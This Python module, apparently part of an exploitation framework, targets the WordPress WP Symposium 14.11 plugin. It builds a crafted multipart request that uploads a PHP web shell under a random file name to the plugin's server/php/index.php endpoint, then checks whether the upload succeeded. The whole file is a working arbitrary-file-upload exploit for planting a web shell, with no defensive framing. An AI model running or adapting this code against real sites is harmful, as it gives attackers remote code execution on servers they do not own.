from ..exploitshell import ExploitShell
import string
import random
import mimetypes


class WPSymposiumShell(ExploitShell):

	exploit_info = {
		'exploit_name': 'Wordpress WP Symposium',
		'exploit_version': '14.11',
		'exploit_url': 'http://www.exploit-db.com/exploits/35543/'
	}

	def exploit(self):
		payloadname = self.checkfile('extras/shell.php')

		url_symposium_upload = self.hostname + '/wp-content/plugins/wp-symposium/server/php/index.php'

		content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'

		randDirName = self.id_generator()
		randShellName = self.id_generator()

		bodyupload = self.create_body_sh3ll_upl04d(payloadname, randDirName, randShellName)

		headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
					'content-type': content_type,
					'content-length': str(len(bodyupload))}

		response = self.request(url_symposium_upload, data=bodyupload, headers=headers)

		if response is None or "error" in response or response == "0" or response == "":
			self.exploitnotfound(self.exploit_info)
		else:
			self.exploitfound(self.exploit_info)

	@staticmethod
	def id_generator(sizeof=6, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
		return ''.join(random.choice(chars) for _ in range(sizeof))

	def create_body_sh3ll_upl04d(self, payloadname, randDirName, randShellName):
		getfields = dict()
		getfields['uploader_uid'] = '1'
		getfields['uploader_dir'] = './' + randDirName
		getfields['uploader_url'] = self.hostname + '/wp-content/plugins/wp-symposium/server/php/index.php'

		payloadcontent = open(payloadname).read()

		LIMIT = '----------lImIt_of_THE_fIle_eW_$'
		CRLF = '\r\n'

		L = []
		for (key, value) in getfields.items():
			L.append('--' + LIMIT)
			L.append('Content-Disposition: form-data; name="%s"' % key)
			L.append('')
			L.append(value)

		L.append('--' + LIMIT)
		L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', randShellName+".php"))
		L.append('Content-Type: %s' % self.get_content_type(payloadname))
		L.append('')
		L.append(payloadcontent)
		L.append('--' + LIMIT + '--')
		L.append('')
		body = CRLF.join(L)
		return body

	@staticmethod
	def get_content_type(filename):
		return mimetypes.guess_type(filename)[0] or 'application/octet-stream'